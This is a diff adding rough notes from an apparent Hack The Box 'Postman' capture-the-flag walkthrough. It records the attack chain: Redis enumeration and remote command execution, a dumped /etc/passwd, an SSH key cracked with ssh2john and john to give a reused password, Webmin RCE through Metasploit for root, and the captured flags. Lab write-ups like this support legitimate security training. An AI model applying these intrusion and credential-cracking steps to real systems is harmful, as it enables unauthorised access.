@@ -1,0 +1,162 @@
+Usernames: root, postman, Postman 
+
+root@Postman
+
+Postman@htb
+
+redis on port 6379 - needed to do a deeper scan to find the port
+- Can connect via telnet
+- redis cli - installing - kali isnt recognizing commands
+	- moving forward to enumerating databse
+
+
+NFO SERVER
+2
+INFO CLIENT
+$471
+# Server
+redis_version:4.0.9
+redis_git_sha1:00000000
+redis_git_dirty:0
+redis_build_id:9435c3c2879311f3
+redis_mode:standalone
+os:Linux 4.15.0-58-generic x86_64
+arch_bits:64
+multiplexing_api:epoll
+atomicvar_api:atomic-builtin
+gcc_version:7.4.0
+process_id:619
+run_id:b3d828c824bec02e49db6a7feaba6deda4858d6f
+tcp_port:6379
+uptime_in_seconds:1029
+uptime_in_days:0
+hz:10
+lru_clock:15066144
+executable:/usr/bin/redis-server
+config_file:/etc/redis/redis.conf
+
+-ERR unknown command '2'
+$0
+
+Connected to 10.10.10.160.
+Escape character is '^]'.
+KEYS * 
+*2
+$6
+foobar
+$7
+crackit
+
+
+Was able to connect and exploit the redis server to gain an initial foothold using the following exploit
+	https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html
+
+- Downloaded the redis database binary 
+
+
+stman:~$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+uuidd:x:105:109::/run/uuidd:/usr/sbin/nologin
+sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
+Matt:x:1000:1000:,,,:/home/Matt:/bin/bash
+redis:x:107:114::/var/lib/redis:/bin/bash
+
+
+redis-cli => to promote slave to master use the command SLAVEOF NO ONE
+
+redis@Postman:/var/backups$ uname -a
+Linux Postman 4.15.0-58-generic #64-Ubuntu SMP Tue Aug 6 11:12:41 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+
+------password hashes ...maybe not correct----
+
+601ecfbc99fd359877552cb5298087ad  /etc/pam.d/common-password
+e5ae8ba8d00083c922d9d82a0432ef78  /etc/pam.d/common-password
+5d518818f1c6c369040b782f7852f53e  /etc/pam.d/common-password
+9ba753d0824276b44bcadfee1f87b6bc        # 1.0.1-4ubuntu5 - 1.0.1-4ubuntu5.5
+4bd7610f2e85f8ddaef79c7db7cb49eb        # 1.0.1-6 - 1.1.0-1
+50fce2113dfda83ac8bdd5a6e706caec        # 1.0.1-6ubuntu1 -
+
+    /etc/apache2/sites-available/default-ssl.conf:              #        Note that no password is obtained from the user. Every entry in the user
+    /etc/apache2/sites-available/default-ssl.conf:              #        file needs this password: `xxj31ZMTZzkVA'.
+
+These are nothing.. the real password file was id_rsa.bak
+
+-----------------
+For the encrypted id_rsa.bak file, we had to convert it to a format the john the ripper could understand
+	- Used ssh2john.py to do this
+	- format is now a "hash" that john can crack with rock you
+
+We have a password after cracking it with john
+	computer2008
+
+Used the openssl command to decrypt it with the provided password
+
+
+redis@Postman:/opt$ ls -la
+total 12
+drwxr-xr-x  2 root root 4096 Sep 11 11:28 .
+drwxr-xr-x 22 root root 4096 Aug 25 15:03 ..
+-rwxr-xr-x  1 Matt Matt 1743 Aug 26 00:11 id_rsa.bak
+
+-----
+Logged in as user Matt with the password computer2008 on the webmin login at https://10.10.10.160:10000/
+
+Was also able to su to him using the same password - User owned
+
+root@kali:~/htb/postman/rsa-files# ssh -i id_rsa redis@10.10.10.160
+Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+Last login: Sun Dec  8 14:51:39 2019 from 10.10.15.148
+redis@Postman:~$ su Matt
+Password: 
+Matt@Postman:/var/lib/redis$ cd /home/
+Matt@Postman:/home$ ls
+Matt
+Matt@Postman:/home$ cd Matt/
+Matt@Postman:~$ ls
+user.txt
+Matt@Postman:~$ cat user.txt
+517ad0ec2458ca97af8d93aac08a2f3c
+
+---------Root OWNED--------
+
+msf5 exploit(linux/http/webmin_packageup_rce) > sessions 1
+[*] Starting interaction with 1...
+
+locate root.txt
+/root/root.txt
+cat /root/root.txt
+a257741c5bed8be7778c6ed95686ddce
+
